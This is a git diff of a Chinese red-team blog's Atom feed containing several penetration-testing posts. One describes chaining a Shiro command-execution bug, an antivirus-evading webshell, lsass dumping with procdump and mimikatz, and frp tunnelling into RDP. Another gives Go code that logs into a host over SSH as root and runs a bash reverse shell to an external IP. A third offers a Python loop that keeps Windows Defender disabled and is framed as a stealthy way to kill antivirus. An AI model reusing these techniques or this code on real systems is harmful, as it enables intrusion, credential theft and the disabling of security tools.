@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2024-08-15T08:51:04.603Z</updated>
+  <updated>2024-10-06T01:42:17.519Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -17,11 +17,33 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>从shiro命令执行到远程桌面登录</title>
+    <link href="http://example.com/2024/10/06/%E4%BB%8Eshiro%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%BD%95/"/>
+    <id>http://example.com/2024/10/06/%E4%BB%8Eshiro%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%BD%95/</id>
+    <published>2024-10-06T01:32:57.000Z</published>
+    <updated>2024-10-06T01:42:17.519Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>一个shiro命令执行并且有回显的口子，直接打各类内存马均失败，powershell一句话上线CS失败，查看进程发现有360、火绒，考虑到内存马不是我的研究方向，从文件下载方向突破</p><h1 id="0x01-突破"><a href="#0x01-突破" class="headerlink" title="0x01 突破"></a>0x01 突破</h1><p>常规的文件下载方式bitsadmin、certutil、ftp等均被拦截，掏出储备的一个免杀的文件下载方式，可成功下载exe文件，尝试下载免杀远控并执行，发现无法执行（原因未知），改为下载魔改过的免杀冰蝎到对应的web目录下，成功连接webshell</p><h1 id="0x02-再突破"><a href="#0x02-再突破" class="headerlink" title="0x02 再突破"></a>0x02 再突破</h1><p>连接上webshell后，尝试执行远控仍旧失败，看来这条路行不通了，上传procdump抓取lsass的内存，想要下载到本地解密，发现不能下载（猜测可能是AV给拦截了），重新梳理下场景，想到既然是shiro的站点，那可以通过web服务下载文件，将文件移动到web目录后成功下载，随后通过mimikatz解出密码，密码真TM复杂啊，上传魔改过的免杀frp，建立隧道后，远程桌面成功连接</p><h1 id="0x03-优化"><a href="#0x03-优化" class="headerlink" title="0x03 优化"></a>0x03 优化</h1><p>远程桌面连接后，发现屏幕字体非常非常小，应该是我本机虚拟机的分辨率太高导致的，此时可以先修改本机的屏幕分辨率，再远程桌面连接后大小刚刚好，但是本机字体会非常非常大，且通过Win10自带的mstsc连接Windows Server 2008 R2时，是不能将密码拷贝到登录界面中，如果密码很复杂的话，不仅费力还容易出错，这里推荐使用UWP版本的远程桌面，可以先设置用户名密码再连接，也就是可以粘贴密码，在紧张的攻防中提供一些便利~</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;一个shiro命令执行并且有回显的口子，直接打各类内存马均失败，powershell一句话上线CS失败，查看进程发现有360、火绒，考虑到内</summary>
+      
+    
+    
+    
+    
+    <category term="攻防技巧" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2%E6%8A%80%E5%B7%A7/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Windows命令学习之ICACLS</title>
     <link href="http://example.com/2024/08/15/Windows%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E4%B9%8BICACLS/"/>
     <id>http://example.com/2024/08/15/Windows%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E4%B9%8BICACLS/</id>
     <published>2024-08-15T08:49:32.000Z</published>
-    <updated>2024-08-15T08:51:04.603Z</updated>
+    <updated>2024-10-06T01:40:04.810Z</updated>
     
     <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>看到一个免杀下载的方式，其中包含这样一条命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls %cd% /deny %username%:(OI)(CI)(DE,DC)</span><br></pre></td></tr></table></figure><p>之前没接触过icacls，通过这篇笔记好好学习一下</p><h1 id="0x02-介绍"><a href="#0x02-介绍" class="headerlink" title="0x02 介绍"></a>0x02 介绍</h1><p>icacls：修改文件（文件夹）的权限</p><p>icacls是cacls和xcacls的增强版（但我在win10中搜索了一下，只搜到cacls，没搜到xcacls）</p><p>windows中文件（文件夹）的权限分为2种：继承的权限（inherit permission）、明确设置的权限（explicit permission）</p><p>可通过执行icacls.exe %cd%来查看当前目录的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\Desktop&gt;icacls.exe %cd%</span><br><span class="line">C:\Users\admin\Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">                       BUILTIN\Administrators:(I)(OI)(CI)(F)</span><br><span class="line">                       DESKTOP-T86MV1G\admin:(I)(OI)(CI)(F)</span><br><span class="line"></span><br><span class="line">已成功处理 1 个文件; 处理 0 个文件时失败</span><br></pre></td></tr></table></figure><p>具体想掌握它是干什么的，怎么使用它，需要耐心的查看下面几个文章：<br><a href="https://ss64.com/nt/icacls.html">https://ss64.com/nt/icacls.html</a><br><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls">https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls</a><br>cmd下执行icacls.exe /?查看用法帮助  </p><p>其中OI、CI、IO是只针对文件夹还是针对文件夹和文件，讲的不是很清楚，有时间测试一下</p><h1 id="0x03-用法"><a href="#0x03-用法" class="headerlink" title="0x03 用法"></a>0x03 用法</h1><p>回到最初那条命令，解释如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 设置当前用户对当前目录的权限为：禁止删除文件（文件夹）、子文件（子文件夹）</span><br><span class="line">icacls %cd% /deny %username%:(OI)(CI)(DE,DC)</span><br></pre></td></tr></table></figure><p>知道了什么含义，也有了上面学习的知识作为基础，我们可以写一个功能一样，形式不一样的命令，也算是一种免杀储备（暂未测试）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">icacls %cd% /deny %username%:(DE,DC) /T</span><br><span class="line">icacls %cd% /deny %username%:(OI)(CI)(D)</span><br><span class="line">icacls %cd% /deny %username%:D /T</span><br></pre></td></tr></table></figure>]]></content>
     
@@ -35,7 +57,7 @@
     
     
     
-    <category term="内网横向" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/"/>
+    <category term="免杀对抗" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/"/>
     
   </entry>
   
@@ -66,7 +88,7 @@
     <link href="http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/"/>
     <id>http://example.com/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/</id>
     <published>2024-05-07T13:35:51.000Z</published>
-    <updated>2024-08-15T08:57:04.988Z</updated>
+    <updated>2024-10-06T01:39:22.662Z</updated>
     
     <content type="html"><![CDATA[<h1 id="0x01-应用场景"><a href="#0x01-应用场景" class="headerlink" title="0x01 应用场景"></a>0x01 应用场景</h1><p>一个命令执行的口子</p><p>主机不出网</p><p>当前是nobody权限，web目录是root权限，写webshell没权限</p><p>通过一个ctf技巧搞了一个webshell，能上传文件但是不能执行命令</p><p>通过webshell将fscan上传到/tmp目录下，通过入口的命令执行漏洞执行fscan，发现内网有ssh弱口令</p><h1 id="0x02-解决方案"><a href="#0x02-解决方案" class="headerlink" title="0x02 解决方案"></a>0x02 解决方案</h1><p>已知连接ssh的同时可以执行命令<br><img src="/2024/05/07/%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9E%E6%8E%A5ssh%E5%B9%B6%E5%8F%8D%E5%BC%B9shell/image-20230731085919496.png" alt="image"><br>当时的想法是连接ssh，然后执行命令反弹shell，但是连接ssh需要交互式shell，第一时间想到expect，经测试主机上没有expect，然后想到通过python中的pexpect去做这件事，发现目标中的python缺少依赖，如果上传python依赖到对应的依赖库目录太麻烦了，最后想到用go去实现，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;bytes&quot;</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line"></span><br><span class="line">&quot;golang.org/x/crypto/ssh&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">username = &quot;root&quot;</span><br><span class="line">password = &quot;P@ssw0rd!&quot;</span><br><span class="line">addr     = &quot;10.62.139.19:22&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">config := &amp;ssh.ClientConfig &#123;</span><br><span class="line">User: username,</span><br><span class="line">Auth: []ssh.AuthMethod&#123;</span><br><span class="line">ssh.Password(password),</span><br><span class="line">&#125;,</span><br><span class="line">HostKeyCallback: ssh.InsecureIgnoreHostKey(),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">client, err := ssh.Dial(&quot;tcp&quot;, addr, config)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to dial: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer client.Close()</span><br><span class="line"></span><br><span class="line">// 开启一个session，用于执行一个命令</span><br><span class="line">session, err := client.NewSession()</span><br><span class="line">if err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to create session: &quot;, err)</span><br><span class="line">&#125;</span><br><span class="line">defer session.Close()</span><br><span class="line"></span><br><span class="line">// 执行命令，并将执行的结果写到 b 中</span><br><span class="line">var b bytes.Buffer</span><br><span class="line">session.Stdout = &amp;b</span><br><span class="line"></span><br><span class="line">// 也可以使用 session.CombinedOutput() 整合输出</span><br><span class="line">if err := session.Run(&quot;bash -i &gt;&amp; /dev/tcp/123.249.104.83/1234 0&gt;&amp;1&quot;); err != nil &#123;</span><br><span class="line">log.Fatal(&quot;Failed to run: &quot; + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(b.String())  // root</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实是在赌目标主机出网，盲打成功接收到反弹shell那一刻，还是挺爽的~</p>]]></content>
     
@@ -81,7 +103,7 @@
     
     
     
-    <category term="Web打点" scheme="http://example.com/tags/Web%E6%89%93%E7%82%B9/"/>
+    <category term="内网横向" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/"/>
     
   </entry>
   
@@ -90,7 +112,7 @@
     <link href="http://example.com/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/"/>
     <id>http://example.com/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/</id>
     <published>2024-05-07T13:30:01.000Z</published>
-    <updated>2024-08-15T08:54:09.214Z</updated>
+    <updated>2024-10-06T01:43:33.592Z</updated>
     
     <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>之前有段时间在搞小程序开发，搞来搞去最终放弃了，不过收获还是蛮多的，记得刚入行安全时，一直想学开发，总觉得不懂开发就搞不好安全，现在也算圆了这个执念，学习开发对安全是有帮助的，不过现在想对那时的自己说一句，不用专门学开发也可以把安全搞得好</p><h1 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h1><p>一个简易的多用户微博系统，每个人都可以在上面留言，欢迎大家留言，地址：<a href="https://static-mp-5cacf972-c2bb-47de-9b31-244f0c9e5038.next.bspapp.com/article/#/">https://static-mp-5cacf972-c2bb-47de-9b31-244f0c9e5038.next.bspapp.com/article/#/</a></p><p>截图如下：<br><img src="/2024/05/07/%E5%B0%8F%E7%A8%8B%E5%BA%8F-%E5%A4%9A%E7%94%A8%E6%88%B7%E5%BE%AE%E5%8D%9A%E7%B3%BB%E7%BB%9F/01.jpg" alt="image"></p>]]></content>
     
@@ -103,7 +125,7 @@
     
     
     
-    <category term="软件开发" scheme="http://example.com/tags/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
+    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
     
   </entry>
   
@@ -112,7 +134,7 @@
     <link href="http://example.com/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
     <id>http://example.com/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/</id>
     <published>2024-05-07T13:25:18.000Z</published>
-    <updated>2024-08-15T08:53:43.767Z</updated>
+    <updated>2024-10-06T01:43:49.418Z</updated>
     
     <content type="html"><![CDATA[<p>程序流程如下<br><img src="/2024/05/07/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E5%BC%80%E5%8F%91%E7%9A%84%E5%B7%A5%E5%85%B7/01.png" alt="image"></p><p>之前做红队时自己开发的工具，代码完全开源到GitHub，地址：<a href="https://github.com/ybdt/RuiningGather-Python">https://github.com/ybdt/RuiningGather-Python</a></p>]]></content>
     
@@ -125,7 +147,7 @@
     
     
     
-    <category term="工具开发" scheme="http://example.com/tags/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"/>
+    <category term="开发" scheme="http://example.com/tags/%E5%BC%80%E5%8F%91/"/>
     
   </entry>
   
@@ -134,7 +156,7 @@
     <link href="http://example.com/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/"/>
     <id>http://example.com/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/</id>
     <published>2024-04-28T12:29:09.000Z</published>
-    <updated>2024-08-15T08:53:29.270Z</updated>
+    <updated>2024-10-06T01:40:22.015Z</updated>
     
     <content type="html"><![CDATA[<h1 id="0x01-成果"><a href="#0x01-成果" class="headerlink" title="0x01 成果"></a>0x01 成果</h1><p>可下载15.3.2.62919（截止到2024.04.03的最新版）到12.5.1.44969之间的任意版本，如下图<br><img src="/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/01.png" alt="image"><br>更旧的版本不能下载，原因见下文</p><h1 id="0x02-起源"><a href="#0x02-起源" class="headerlink" title="0x02 起源"></a>0x02 起源</h1><p>想用旧版本向日葵测试一个功能，发现官网只提供最新版下载，故研究下如何下载旧版本</p><h1 id="0x03-过程"><a href="#0x03-过程" class="headerlink" title="0x03 过程"></a>0x03 过程</h1><p>下载页面点击下载后，burp抓包，依次筛选每个请求包，发现如下请求包最像下载链接<br><img src="/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/02.png" alt="image">  如图可看到，根据参数versionid指定版本，试了下2225、2224都返回404，看来不是每个数字都有对应版本，写个python脚本生成1到2226的字典，请求包扔到Intruder中进行爆破，发现如上请求id返回302<br><img src="/2024/04/28/%E5%90%91%E6%97%A5%E8%91%B5%E6%97%A7%E7%89%88%E6%9C%AC%E4%B8%8B%E8%BD%BD/03.png" alt="image">  ok，现在我们可以根据id下载对应版本</p><h1 id="0x04-遗憾"><a href="#0x04-遗憾" class="headerlink" title="0x04 遗憾"></a>0x04 遗憾</h1><p>经测试，版本SunloginClient_12.5.0.44227_x64.exe及之前的版本，下载后会返回404，猜测可能官方给删除了</p>]]></content>
     
@@ -147,7 +169,7 @@
     
     
     
-    <category term="内网横向" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/"/>
+    <category term="免杀对抗" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/"/>
     
   </entry>
   
@@ -245,7 +267,7 @@
     <link href="http://example.com/2024/02/03/%E8%A7%A3%E5%86%B3Windows-Defender%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%88%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%9A%84%E5%9B%B0%E6%89%B0/"/>
     <id>http://example.com/2024/02/03/%E8%A7%A3%E5%86%B3Windows-Defender%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%88%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%9A%84%E5%9B%B0%E6%89%B0/</id>
     <published>2024-02-03T02:56:48.000Z</published>
-    <updated>2024-08-15T08:52:18.842Z</updated>
+    <updated>2024-10-06T01:40:37.900Z</updated>
     
     <content type="html"><![CDATA[<p>有这样一个需求，我有一台Win10系统用作服务器跑程序，但不想装杀软，可是Win10系统不装杀软的话就会自动开启Defender，之前的笔记中记载，执行如下2步可关闭Windows Defender</p><span id="more"></span><p>01 关闭篡改防护</p><p>02 修改注册表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender</span><br><span class="line">New-&gt;DWORD (32-bit) Value</span><br><span class="line">DisableAntiSpyware</span><br><span class="line">1（十进制下）</span><br></pre></td></tr></table></figure><p>结果在使用中发现，过一会Windows又会将注册表改回去，这让我想到，是不是可以写一个程序来持续监测注册表，当发现Windows将它改回来后再改回去</p><h1 id="注册表操作学习"><a href="#注册表操作学习" class="headerlink" title="注册表操作学习"></a>注册表操作学习</h1><p>这里选择我比较熟悉的语言python，python操作注册表官方推荐的库是winreg，官方文档在这里：<a href="https://docs.python.org/3.8/library/winreg.html#module-winreg">https://docs.python.org/3.8/library/winreg.html#module-winreg</a>，具体函数用法官方文档写的很详细，我就不赘述了，这里主要记录下学习这些函数过程中遇到的坑</p><p>模块winreg中共包含18个操作注册表的函数，分别如下：<br>关闭键、连接注册表、创建键、删除键、删除值、枚举键、枚举值、扩展环境字符串、刷新键、载入键、打开键、查询键信息、查询值、保存键、设置值、关闭反射键、开启反射键、查询反射键</p><h2 id="注册表中的一些概念"><a href="#注册表中的一些概念" class="headerlink" title="注册表中的一些概念"></a>注册表中的一些概念</h2><p>需要先明确一下注册表中的一些概念，否则后面看文档时会混乱搞不清楚</p><p>注册表左边的通常称为键、子健 或 项、子项<br>注册表右边的通常称为值，包含：值名称、值类型、值数据<br>如下图</p><p><img src="/2024/02/03/%E8%A7%A3%E5%86%B3Windows-Defender%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%88%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%9A%84%E5%9B%B0%E6%89%B0/01.png" alt="image"></p><h2 id="OpenKey、OpenKeyEx（打开键）"><a href="#OpenKey、OpenKeyEx（打开键）" class="headerlink" title="OpenKey、OpenKeyEx（打开键）"></a>OpenKey、OpenKeyEx（打开键）</h2><p>其中OpenKeyEx是OpenKey的扩展版本，也就是加强版本</p><p>函数原型 -&gt; winreg.OpenKeyEx(key, sub_key, reserved=0, access=KEY_READ)</p><p>官方文档中有1个坑</p><p>第4个参数的介绍是：”access is an integer that specifies an access mask that describes the desired security access for the key. Default is KEY_READ. See Access Rights for other allowed values.”，没用过这个函数的人，看到这个介绍，会觉得值应该是整数，尝试后发现不是，然后尝试 KEY_READ 发现也不是，最后经过尝试发现是winreg.KEY_ALL_ACCESS</p><p>另外需要注意，第4个参数如果设置不正确，后面写入值的时候，会报错提示权限问题，其中winreg.KEY_ALL_ACCESS是权限最大的，直接设置为它就可以</p><h2 id="SetValue、SetValueEx（设置值）"><a href="#SetValue、SetValueEx（设置值）" class="headerlink" title="SetValue、SetValueEx（设置值）"></a>SetValue、SetValueEx（设置值）</h2><p>其中SetValueEx是SetValue的扩展版本，也就是加强版本</p><p>函数原型 -&gt; winreg.SetValueEx(key, value_name, reserved, type, value)</p><p>官方文档有2个坑</p><p>第1个坑是第2个参数，介绍是：”alue_name is a string that names the subkey with which the value is associated.”，翻译过来这个参数应该是子健的名字，但其实它应该是值名称，对应上面注册表的概念</p><p>第2个坑是第4个参数，介绍是：”type is an integer that specifies the type of the data. See Value Types for the available types.”，跟OpenKeyEx中的坑类似，值不是整数，是winreg.REG_DWORD</p><p>另外，关于第4个参数，一开始我没发现怎么用的时候，用到了一个小技巧，先手动设置注册表的值，然后使用winreg.QueryValueEx读取对应的值，可获取值数据和值类型</p><h2 id="UAC问题"><a href="#UAC问题" class="headerlink" title="UAC问题"></a>UAC问题</h2><p>操作注册表需要过UAC，python中可通过库elevate请求获取UAC权限，用法很简单如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from elevate import elevate</span><br><span class="line"></span><br><span class="line">elevate()</span><br></pre></td></tr></table></figure><p>elevate()之后的代码都是过UAC后的权限</p><h1 id="完整源码"><a href="#完整源码" class="headerlink" title="完整源码"></a>完整源码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import winreg</span><br><span class="line">from elevate import elevate</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">elevate()</span><br><span class="line">while True:</span><br><span class="line">    key = winreg.OpenKeyEx(winreg.HKEY_LOCAL_MACHINE, &quot;SOFTWARE\Policies\Microsoft\Windows Defender&quot;, 0, winreg.KEY_ALL_ACCESS)</span><br><span class="line">    try:</span><br><span class="line">        value, type = winreg.QueryValueEx(key, &quot;DisableAntiSpyware&quot;)</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;注册表项 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender 不包含值 DisableAntiSpyware，正在添加...&quot;)</span><br><span class="line">        winreg.SetValueEx(key, &quot;DisableAntiSpyware&quot;, 0, winreg.REG_DWORD, 1)</span><br><span class="line">        print(&quot;成功添加值 DisableAntiSpyware&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;注册表项 HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender 包含值 DisableAntiSpyware，且值数据为&#123;&#125;，值类型为&#123;&#125;&quot;.format(value, str(type)))</span><br><span class="line">    time.sleep(3)</span><br></pre></td></tr></table></figure><p>使用pyinstaller将上述源码打包成exe后，拷贝到目标服务器上，执行后过一会可看到Defender已经关闭，如下图</p><p><img src="/2024/02/03/%E8%A7%A3%E5%86%B3Windows-Defender%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%88%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%9A%84%E5%9B%B0%E6%89%B0/02.png" alt="image"></p><h1 id="引申思考"><a href="#引申思考" class="headerlink" title="引申思考"></a>引申思考</h1><p>上图中可看到，Defender托盘图标没有变化，但防病毒功能已经关闭了，由此联想，是否可以作为一种隐蔽的关闭杀软的方式</p>]]></content>
     
@@ -255,7 +277,7 @@
     
     
     
-    <category term="内网横向" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/"/>
+    <category term="免杀对抗" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/"/>
     
   </entry>
   
